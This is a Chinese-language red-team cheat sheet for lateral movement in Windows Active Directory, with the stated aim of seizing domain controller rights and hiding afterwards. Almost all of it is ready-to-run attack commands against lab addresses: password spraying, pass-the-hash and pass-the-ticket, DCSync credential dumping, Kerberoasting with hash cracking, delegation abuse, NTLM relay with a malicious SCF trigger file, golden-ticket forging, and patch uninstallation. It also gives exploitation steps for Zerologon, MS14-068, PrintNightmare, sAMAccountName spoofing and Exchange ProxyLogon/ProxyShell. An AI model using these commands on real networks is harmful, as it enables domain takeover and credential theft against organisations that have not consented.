# *横向（此阶段的目的是为了内网域环境的横向渗透，获得域控权限，方便后续隐藏。）

时间同步，dns解析，spn(创建，扫描，删除)



SID枚举/RID枚举，域用户名枚举，密码喷洒，密码/Hash碰撞，定位域控/用户/管理员，PTK&PTH&PTT，TGT&ST，票据转换，滥用dcsync，AS-REP Roasting，Kerberoasting，委派(非约束性委派，约束性委派，基于资源的约束性委派)，NTLM Relay(捕获，触发，破解，中继)，域林渗透



MS14-068 权限提升漏洞，CVE-2020-1472 NetLogon权限提升漏洞，CVE-2019-1040 ，NTLM MIC绕过漏洞(需要存在exchange服务器，或多台域控)，Print Spooler 权限提升漏洞，CVE-2021-42287/42278 权限提升漏洞，Exchange ProxyLogon 攻击利用链，Exchange ProxyShell 攻击利用链，kerberos中继



#### 时间同步

ntpdate 192.168.10.5 #通过ntp协议(ntp(123))

net time -S 192.168.10.5 #通过smb协议(135,445)

#### dns解析

sed -i '1i192.168.12.5 two.com' /etc/hosts

sed -i '1i192.168.12.5 DC.two.com' /etc/hosts

#### spn(创建，扫描，删除)

setspn -A xxx/DC.two.com:5555 win2019

powerview : Set-DomainObject -Identity "win2019" -Append "serviceprincipalname=will/DC.two.com:6789"



setspn -T two.com -q */*

powerview : Get-DomainUser -SPN -Select 'cn,distinguishedName,servicePrincipalName' -TableView

powerview : Get-DomainComputer -SPN -Select 'cn,distinguishedName,servicePrincipalName' -TableView



setspn -D xxx/DC.two.com:5555 win2019

powerview : Set-DomainObject -Identity "win2019" -Remove "serviceprincipalname=will/DC.two.com:6789"

#### SID枚举/RID枚举

impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\samr]' samr操作数枚举

impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\lsarpc]' lsarpc操作数枚举



impacket-samrdump two.com/win2019:'root'@192.168.12.5 #samr

impacket-lookupsid two.com/win2019:'root'@192.168.12.5 #lsarpc



nxc smb 192.168.12.5 192.168.12.5 -u win2019 -p root --rid-brute



enum4linux-ng -u win2019 -p root 192.168.12.5 -U -R

rpcclient $> enumdomains ; lookupdomain ; lookupsids ; lookupsids S-1-5-21-873118422-227618334-1429070027-1000/1001/1002 ; lookupnames win2019

#### 域用户名枚举

metasploit : use auxiliary/gather/kerberos_enumusers

set domain two.com

set rhosts 192.168.12.5

set user_file users.txt



kerbrute : ./kerbrute userenum --dc 192.168.12.5 -d two.com users.txt

#### 密码喷洒

metasploit : use scanner/smb/smb_login

set domain two.com

set rhosts 192.168.12.5

set user_file users.txt

set smbpass 1qaz@WSX



nxc smb 192.168.12.5 -u users.txt -p '1qaz@WSX' --continue-on-success



kerbrute : ./kerbrute passwordspray --dc 192.168.12.5 -d two.com users.txt "1qaz@WSX"

#### 密码/Hash碰撞

metasploit(psexec)

use exploit/windows/smb/psexec

set smbdomain two.com

set smbuser administrator

set rhosts 192.168.12.0/24

set payload windows/meterpreter/bind_tcp

set lport 5555



set smbpass 1qaz@WSX #密码碰撞

set smbpass aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 #Hash碰撞



nxc

nxc smb 192.168.12.5/24 -u administrator -p 1qaz@WSX #密码碰撞

nxc smb 192.168.12.0/24 -u administrator --hash aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 #Hash碰撞

#### 定位域控/用户/管理员

net time /domain #定位域控



use post/windows/gather/enum_domain #定位域控

set session 1



https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon

PsLoggedon.exe /accepteula \\192.168.12.5



nxc smb 192.168.12.0/24 -u administrator -p 1qaz@WSX --loggedon-users

#### PTK&PTH&PTT #localgroup只有administrator用户可远程访问，dc不受影响

###### metasploit(psexec)

use exploit/windows/smb/psexec

set smbdomain two.com

set smbuser win2019

set rhosts 192.168.12.5

set payload windows/meterpreter/bind_tcp

set lport 5555



set smbpass root #PTK



set smbpass 00000000000000000000000000000000:329153f560eb329c0e1deea55e88a1e9 #PTH



###### impacket(psexec,smbexec,wmiexec,dcomexec,atexec)

impacket-psexec -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 #PTK



impacket-psexec -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 #PTH



export KRB5CCNAME=win2019@192.168.12.5.ccache #PTT

impacket-psexec -dc-ip 192.168.12.5 DC.two.com -no-pass -k



###### nxc(smb,wmi,winrm,ldap)

nxc smb 192.168.12.5 -u win2019 -p root -x 'whoami' #PTK



nxc smb 192.168.12.5 -u win2019 --hash 00000000000000000000000000000000:329153f560eb329c0e1deea55e88a1e9 -x 'whoami' #PTH



export KRB5CCNAME=win2019@192.168.12.5.ccache #PTT

nxc smb 192.168.12.5 --use-kcache -x 'whoami'



###### evil-winrm

evil-winrm -i 192.168.12.5 -u win2019 -p root #PTK



evil-winrm -i 192.168.12.5 -u win2019 -H 329153f560eb329c0e1deea55e88a1e9 #PTH



###### mimikatz

privilege::debug

sekurlsa::logonpasswords #PTH

sekurlsa::pth /user:win2019 /domain:two.com /ntlm:329153f560eb329c0e1deea55e88a1e9 /run:cmd.exe



kerberos::purge #PTT

kerberos::ptt xxx.kirbi

kerberos::list

#### TGT&ST

###### impacket

impacket-getTGT -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 #TGT #PTK

impacket-getTGT -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 #TGT #PTK



impacket-getST -dc-ip 192.168.12.5 two.com/win2019:root@192.168.12.5 -spn cifs/DC.two.com #ST #PTK

impacket-getST -dc-ip 192.168.12.5 two.com/win2019@192.168.12.5 -hashes :329153f560eb329c0e1deea55e88a1e9 -spn cifs/DC.two.com #ST #PTH

export KRB5CCNAME=win2019@192.168.12.5.ccache #ST #PTT

impacket-getST -dc-ip 192.168.12.5 two.com/win2019 -no-pass -k -spn cifs/DC.two.com



###### mimikatz

privilege::debug

kerberos::list /export /target:krbtgt #TGT

kerberos::list /export /target:cifs #ST

kerberos::list /export #TGT&ST

sekurlsa::tickets /export #kerberos+localgroup

#### 票据转换

impacket-ticketConverter admin.kirbi admin.cache

#### 滥用dcsync

Administrators 组，Domain Admins 组，Enterprise Admins 组，具有DS-Replication-Get-Changes权限/具有DS-Replication-Get-ChangesAll权限

###### 添加/查询/删除dcsync

Get-DomainObjectAcl -Where 'ObjectAceType contains DS-Replication-Get-Changes' -Select 'SecurityIdentifier,ObjectDN,AccessMask,ObjectAceType' -TableView  #查询包含dcsync权限的账户

Add-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #赋予指定账户DCSync权限

Remove-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #删除指定账户DCSync权限

###### 获取dcsync

impacket-secretsdump -dc-ip 192.168.12.5 two.com/john:"1qaz@WSX"@192.168.12.5

lsadump::dcsync /domain:two.com /all /csv

#### AS-REP Roasting(开启"不要求Kerberos预身份验证")

metasploit : use auxiliary/gather/asrep

set ldapdomain two.com

set rhosts 192.168.12.5

set user_file users.txt



impacket : impacket-GetNPUsers -dc-ip 192.168.12.5 two.com/ -usersfile users.txt -format john



hashcat -m 18200 hash.hash pass.txt --potfile-disable

john hash.hash --format=krb5asrep --wordlist=pass.txt --pot=hash.pot

#### Kerberoasting(需要域用户身份凭证，需要"不要求Kerberos预身份验证"用户名和一组用户名)

###### 需要域用户身份凭证

metasploit : use auxiliary/gather/kerberoast (hashcat)

set ldapdomain two.com

set rhosts 192.168.12.5

set ldapusername hack

set ldappassword 1qaz@WSX



impacket : impacket-GetUserSPNs -dc-ip 192.168.12.5 two.com/win2019:root -request

###### 需要"不要求Kerberos预身份验证"用户名和一组用户名

impacket-GetUserSPNs -dc-ip 192.168.10.5 two.com/ -usersfile users.txt -no-preauth hack -request

hashcat -m 13100 hash.hash pass.txt --potfile-disable

john hash.hash --format=krb5tgs --wordlist=pass.txt --pot=hash.pot

#### 委派(非约束性委派，约束性委派，基于资源的约束性委派)

###### 委派查询(主机账户/服务账户)

powerview : powerview two.com/win2019:root@192.168.12.5

Get-DomainComputer -Unconstrained #非约束性委派(主机账户)

Get-DomainUser -Unconstrained #非约束性委派(服务账户)



Get-DomainComputer -TrustedToAuth #约束性委派(主机账户)

Get-DomainUser -TrustedToAuth #约束性委派(服务账户)



Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" #基于资源的约束性委派(主机账户/服务账户)

Get-DomainObject -Identity "krbtgt" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

impacket : impacket-findDelegation two.com/win2019:root

###### 非约束性委派(需要一个域内账号，以及一个开启非约束性委派的域内主机权限)

github.com/ntfndOfficial/ActiveDirectoryTools

github.com/leechristensen/SpoolSample



Rubeus.exe monitor /interval:1 /filteruser:DC$ #域内主机本地管理员运行(监听来自DC打印机的回应)



SpoolSample.exe DC w2016-2 #域用户运行(强制要求DC打印机发起请求)



cat base64_file | tr -d ' \n'

Rubeus.exe ptt /ticket:base64



privilege::debug #获取并导入dc.kirbi

sekurlsa::tickets /export

kerberos::ptt [0;3308f]-2-0-60a10000-DC$@krbtgt-TWO.COM.kirbi



privilege::debug

lsadump::dcsync /domain:two.com /all /csv



###### 约束性委派(需要一个域用户，以及该域用户拥有委派DC的约束委派)

impacket-getST -dc-ip 192.168.12.5 two.com/hack:"1qaz@WSX" -spn cifs/DC.two.com -impersonate administrator -force-forwardable



impacket-secretsdump -dc-ip 192.168.12.5 DC.two.com -no-pass -k



###### 基于资源的约束性委派(需要一个域内用户，以及他可以修改msDS-AllowedToActOnBehalfOfOtherIdentity的域内主机)

impacket-addcomputer -dc-ip 192.168.12.5 two.com/win2019:root -computer-name "hack_machine$" -computer-pass 1qaz@WSX #添加机器用户hack_machine$



impacket-rbcd -dc-ip 192.168.12.5 two.com/win2019:root -action write -delegate-to "w2016-2$" -delegate-from "hack_machine$" #写入机器用户hack_machine$到目标域内机器w2016-2$的基于资源的约束性委派



impacket-getST -dc-ip 192.168.12.5 two.com/hack_machine$:"1qaz@WSX" -spn cifs/w2016-2.two.com -impersonate administrator [-force-forwardable] #获取伪造ST



sed -i '1i192.168.12.134 w2016-2.two.com' /etc/hosts



impacket-wmiexec -dc-ip 192.168.12.5 w2016-2.two.com -no-pass -k

*[-force-forwardable] #强制使通过S4USelf获得的服务票据进行转发，允许绕过受保护的用户(即Protected Users组内用户)，允许绕过仅使用Kerberos的受限委派限制 #CVE-2020-17049

#### NTLM Relay(捕获，触发，破解，中继)

###### 捕获Net-NTLM Hash

responder -I eth0

###### 触发Net-NTLM认证

smb

dir \\192.168.12.130\guest



http

http://192.168.12.130/guest #大部分浏览器需主动输入用户名和密码

 \#大部分浏览器需主动输入用户名和密码



scf

[shell]

Command=2

IconFile=\\192.168.12.130\guest

[Taskbar]

Command=Explorer

###### 破解Net-NTLM(v2)

hashcat -m 5600 hash passwd.txt --potfile-disable

john hash -format=netntlmv2 -wordlist=passwd.txt --pot=1.pot

###### 中继Net-NTLM Hash(工作组/域)(本地管理员，域管理员)

\#查看smb签名(只有未签名的主机才能作为被中继主机)

python /usr/share/responder/tools/RunFinger.py -i 192.168.10.1/24



smb->smb

impacket-ntlmrelayx -t smb://192.168.12.134 -c whoami -smb2support

dir \\192.168.12.130\guest



smb->ldap/http

impacket-ntlmrelayx -t ldap://192.168.12.5 -c whoami -smb2support --remove-mic

impacket-ntlmrelayx -t http://192.168.12.5 -c whoami -smb2support --remove-mic

dir \\192.168.12.130\guest



http->ldap(需明文用户&明文密码)

impacket-ntlmrelayx -t ldap://192.168.12.5 -c whoami -smb2support --remove-mic

http://192.168.12.130/guest

#### 域林渗透

inter-realm_key+SID_history

需求 : rc4_hmac_nt_hash，son_domain_sid，domain_Enterprise_Admins_sid

mimikatz.exe "privilege::debug" "lsadump::trust" /patch" "exit" #获得rc4_hmac_nt_hash



impacket-ticketer administrator -nthash rc4_hmac_nt_hash -domain-sid son_domain_sid -extra-sid domain_Enterprise_Admins_sid -domain son.domain.com -spn krbtgt/domain.com #伪造domain_gold_ticket



删除补丁

wusa /uninstall /kb:5023774

#### MS14-068 权限提升漏洞

影响版本 : 

Windows Server 2003

Windows Vista

Windows Server 2008

Windows 7

Windows 8 and Windows 8.1

Windows Server 2012（以上系列的部分版本）

补丁 : KB3011780

利用 : 

mimikatz : 

https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

MS14-068.exe -u 用户名@域 -p 用户密码 -s 用户SID -d DC的IP

kerberos::purge

kerberos::ptc TGT_xxx@xxx.ccache



impacket : 

impacket-goldenPac -dc-ip 192.168.12.5 two.com/john:"1qaz@WSX"@192.168.12.5

#### CVE-2020-1472 NetLogon权限提升漏洞

影响版本 :

Windows Server 2008 R2 for x64-based Systems Service Pack 1

Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)

Windows Server 2012

Windows Server 2012 (Server Core installation)

Windows Server 2012 R2

Windows Server 2012 R2 (Server Core installation)

Windows Server 2016

Windows Server 2016 (Server Core installation)

Windows Server 2019

Windows Server 2019 (Server Core installation)

Windows Server, version 1903 (Server Core installation)

Windows Server, version 1909 (Server Core installation)

Windows Server, version 2004 (Server Core installation)

利用 :

https://github.com/SecuraBV/CVE-2020-1472 : zerologon_tester

python3 zerologon_tester.py DC 192.168.1.53

https://github.com/risksense/zerologon : zerologon

python3 set_empty_pw.py DC 192.168.1.53 #将域控密码置空



impacket-secretsdump troila.com/dc\$@192.168.1.53 –no-pass

#### CVE-2019-1040 NTLM MIC绕过漏洞(需要存在exchange服务器，或多台域控)

影响版本 : (Windwos 7 SP 1 至 Windows 10 1903，Windows Server 2008 至 Windows Server 2019)

利用 :

impacket-ntlmrelayx --escalate-user hack -t ldap://域控_ip -smb2support --no-dump  --remove-mic #中继成功赋予hack DCSync 权限

https://github.com/dirkjanm/krbrelayx

python3 printerbug.py hack/hack:Admin123@exchange服务器_ip 攻击者_ip #攻击exchange服务器

#### Print Spooler 权限提升漏洞

影响版本 : 

windows 7

windows 8.1

windows Server 2008

windows Server 2012

windows Server 2016

windows Server 2019

windows 10

利用 :

rpcdump.py @IP | egrep 'MS-RPRN|MS-PAR'

search print spooler

getsystem

exploit/windows/dcerpc/cve_2021_1675_printnightmare

#### ADCS 攻击



#### CVE-2021-42287/42278 权限提升漏洞

https://github.com/safebuffer/sam-the-admin

python3 sam_the_admin.py "redteam/root:Red12345" -dc-ip 10.0.0.12 -shell

#### Exchange ProxyLogon 攻击利用链

影响版本 : 

Microsoft Exchange Server 2013 低于 15.00.1497.012 的版本

Microsoft Exchange Server 2016 低于 15.01.2106.013 的版本

Microsoft Exchange Server 2019 低于 15.02.0721.013 的版本

Microsoft Exchange Server 2019 低于 15.02.0792.010 的版本

利用 :

auxiliary/scanner/http/exchange_proxylogon

exploit/windows/http/exchange_proxylogon_rce

#### Exchange ProxyShell 攻击利用链

影响版本 : 

Microsoft Exchange Server 2013 Cumulative Update 23 及更早版本

Microsoft Exchange Server 2016 Cumulative Update 19、20 及更早版本 

Microsoft Exchange Server 2019 Cumulative Update 8、9 及更早版本

利用 :

exploit/windows/http/exchange_proxyshell_rce

#### kerberos中继

https://github.com/cube0x0/KrbRelay?tab=readme-ov-file

项目需要bulid

krbrelay.exe -ntlm -session 1 -clsid "354ff91b-5e49-4bdc-a8e6-1cb6c6877182" 

其中session 通过powershell qwinsta获得